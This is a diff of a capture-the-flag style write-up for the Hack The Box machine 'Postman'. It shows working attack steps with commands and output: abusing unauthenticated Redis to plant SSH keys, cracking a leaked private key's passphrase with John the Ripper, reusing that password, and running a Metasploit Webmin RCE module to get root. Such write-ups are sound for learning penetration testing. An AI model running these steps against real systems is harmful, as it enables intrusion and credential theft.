@@ -1,31 +1,32 @@
 ---
 layout: single
-title: HTB - Postman
+title: Postman - Hack The Box
+excerpt: "Postman was an easy straight forward box. It had realistic vulnerabilities which had CVEs about them. I had to write my ssh public keys into a redis user keys file and then connect to the server to obtain another private ssh keys which further leads to obtaining access to a Webmin application, vulnerable to a remote code execution to gain root access"
 date: 2020-03-13
 classes: wide
 header:
-  teaser: /assets/images/hackthebox/postman/postman-logo.jpg
+  teaser: /assets/images/hackthebox/postman/postman-logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox/hackthebox.png
 categories:
-  - redis
-  - webmin
-  - pentesting
-  - ssh keys
+  - hackthebox
 tags:
   - redis
   - linux
   - CVE
   - webmin
+  - rce
 ---
 
 
 
 ## Summary
 
-Smummary goes here
+Postman was an easy straight forward box. It had realistic vulnerabilities which had CVEs about them. I had to write my ssh public keys into a redis user keys file and then connect to the server to obtain another private ssh keys which further leads to obtaining access to a Webmin application, vulnerable to a remote code execution to gain root access.
 
 ## Box Details
 
-![] (/assets/images/hackthebox/postman/postman-logo.jpg)
+![] (/assets/images/hackthebox/postman/postman-logo.png)
 
 ## Recon
 
@@ -115,33 +116,7 @@ I don't usually enumerate SSH ports unless I have credentials to test. I will le
 
 Enumerating the web page showed a landing page with a statement about the site being under construction. Further tests with `nikto` and directory bruteforcing using `dirsearch` did not give any interesting results.
 
-'''
-- Nikto v2.1.6
----------------------------------------------------------------------------
-+ Target IP:          10.10.10.160
-+ Target Hostname:    10.10.10.160
-+ Target Port:        80
-+ Start Time:         2019-11-02 22:36:53 (GMT0)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.29 (Ubuntu)
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ IP address found in the 'location' header. The IP is "127.0.1.1".
-+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
-+ Server may leak inodes via ETags, header found with file /, inode: f04, size: 590f549ce0d74, mtime: gzip
-+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
-+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
-+ OSVDB-3268: /css/: Directory indexing found.
-+ OSVDB-3092: /css/: This might be interesting...
-+ OSVDB-3268: /images/: Directory indexing found.
-+ OSVDB-3233: /icons/README: Apache default file found.
-+ 7865 requests: 0 error(s) and 12 item(s) reported on remote host
-+ End Time:           2019-11-02 23:06:48 (GMT0) (1795 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-
+```
 $ sudo python3 /opt/dirsearch/dirsearch.py -u 10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -e php,html -f --plain-text-report postman_brute.txt
 [sudo] password for cyb3r:
 
@@ -167,13 +142,13 @@ Target: 10.10.10.160
 [11:43:44] 403 -  301B  - /server-status/
 
 Task Completed
-'''
+```
 
 ### TCP Port 6379
 
 From the nmap printout, I could see that redis is running on this port. Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. By default Redis binds to all the interfaces and has no authentication at all. The version of redis running on the server is 4.0.9. I can connect to verify if authentication is reuqired or not using telnet:
 
-'''
+```
 $ telnet 10.10.10.160 6379
 Trying 10.10.10.160...
 Connected to 10.10.10.160.
@@ -184,7 +159,7 @@ Hey no AUTH required!
 quit
 +OK
 Connection closed by foreign host
-'''
+```
 
 This proves that there isn't any authentication required. We can thus leaverage on this to get a remote code execution and get direct access to the server. To do this, we can generate SSH key and append the public key to the server and login using the private keys. More information can be found [here](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html).
 
@@ -200,22 +175,22 @@ From the nmap scan results, I can see the version of Webmin on the server is `1.
 
 Having identified that the service is running unauthenticated and thus I will try to gain access by creating SSH keys and append the public keys to the user's authorized key file and then login with the private key. To do this, I need to find the location of the home directory of the service user account as well as the account name:
 
-'''
-# redis-cli -h 10.10.10.160 -p 6379
+```
+$ redis-cli -h 10.10.10.160 -p 6379
 10.10.10.160:6379> config get dir
 1) "dir"
 2) "/var/lib/redis/.ssh"
 10.10.10.160:6379> config get dir
 1) "dir"
 2) "/var/lib/redis/.ssh"
-'''
+```
 
 From this printout, I can deduce that the user name is `redis` and the home directory is `/var/lib/redis` and can therefore save the SSH keys within the `.ssh` directory. There is a publicly available script to automate this by supplying the right directory and user name. Script can be found [here](https://github.com/Avinash-acid/Redis-Server-Exploit).
 
 Editing the script to provide the correct redis user home directory, I executed it to obtain a shell as user redis:
 
-'''
-# python redis.py 10.10.10.160 redis
+```
+$ python redis.py 10.10.10.160 redis
 	*******************************************************************
 	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
 	* [+] AVINASH KUMAR THAPA aka "-Acid"
@@ -251,37 +226,26 @@ OK
 OK
 OK
 	You'll get shell in sometime..Thanks for your patience
-Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 Last login: Tue Dec  3 13:24:55 2019 from 10.10.15.253
 redis@Postman:~$ pwd
 /var/lib/redis
 redis@Postman:~$
-'''
+```
 
 ### redis to Matt
 
 After gaining access to the server and searching for the user.txt file, I noticed it within user Matt's home directory and my current access couldn't read the file:
 
-'''
+```
 redis@Postman:/home/Matt$ cat user.txt
 cat: user.txt: Permission denied
 redis@Postman:/home/Matt$
-'''
+```
 
 To further enumerate the system, I run the LinEnum.sh script to try to find any juicy stuffs to enable increase privileges on the system. I found a backup of a SSH private key, owned by Matt but readable by every user. I tried connecting to the server as Matt using this private key but it required a passphrase.
 
-'''
+```
 [-] SSH keys/host information found in the following locations:
 -rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 /opt/id_rsa.bak
 
@@ -317,17 +281,16 @@ VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
 X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
 -----END RSA PRIVATE KEY-----
 
-# ssh -i matt_private.key Matt@10.10.10.160
+$ ssh -i matt_private.key Matt@10.10.10.160
 Enter passphrase for key 'matt_private.key':
 Enter passphrase for key 'matt_private.key':
-'''
+```
 
 Only option now is to convert file to a hash using ssh2john and then use JohnTheRipper to crack the resulting hash. I was able to successfully crack the hash and retrieve the passphrase of `computer2008`
 
-'''
-# /opt/JohnTheRipper/run/ssh2john.py matt_private.key > matt_hashes.txt
-
-# john --wordlist=/usr/share/wordlists/rockyou.txt matt_hashes.txt
+```
+$ /opt/JohnTheRipper/run/ssh2john.py matt_private.key > matt_hashes.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt matt_hashes.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
@@ -339,12 +302,12 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 computer2008     (matt_private.key)
 1g 0:00:00:20 DONE (2019-12-03 13:57) 0.04819g/s 691166p/s 691166c/s 691166C/sa6_123..*7¡Vamos!
 Session completed
-'''
+```
 
 I tried connection to the server using the SSH port as Matt but this failed as connect was closed whenever I tried connecting. Further checks revealed that user Matt is denied access through SSH on the server:
 
-'''
-# ssh -i matt_private.key Matt@10.10.10.160
+```
+$ ssh -i matt_private.key Matt@10.10.10.160
 Enter passphrase for key 'matt_private.key':
 Connection closed by 10.10.10.160 port 22
 
@@ -362,19 +325,17 @@ DenyUsers Matt
 
 ...snip...
 redis@Postman:/etc/ssh$
-
-'''
+```
 
 There's a chance the passphrase for the ssh private key is the same password used for the system. I tried changing user from redis user to Matt and it worked successfully and was able to grab the user.txt
 
-'''
+```
 redis@Postman:~$ su - Matt
 Password:
 Matt@Postman:~$ cat user.txt
 517ad0ec...........
 Matt@Postman:~$
-
-'''
+```
 
 ## Privilege Escalation
 
@@ -382,11 +343,11 @@ Matt@Postman:~$
 
 Having access as Matt now, I run further linux enumeration script `LinEnum.sh` but nothing really popped out except noticing that the process for Webmin was running as user root. Thus based on my initial enumeration of the TCP port 10000 we could leverage this and gain access as root. As the Webmin vulnerability required authentication, it's possible Matt's access could be used on the Webmin application(think credential reuse). I tried using Matt's access and I successfully logged in. Therefore we can use this to gain root access using authenticated remote code execution.
 
-![] (/assets/images/hackthebox/postman/tcp-10000-auth-login.jpg)
+![] (/assets/images/hackthebox/postman/tcp-10000-auth-login.png)
 
 Using searchspoilt, I found a module available in metasploit to exploit this Webmin vulnerability and used the module to gain access to the system as root:
 
-'''
+```
 msf5 > use exploit/linux/http/webmin_packageup_rce
 msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
 PASSWORD => computer2008
@@ -414,5 +375,4 @@ root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
 cat /root/root.txt
 a257741..............
 root@Postman:/usr/share/webmin/package-updates/#
-
-'''
+```
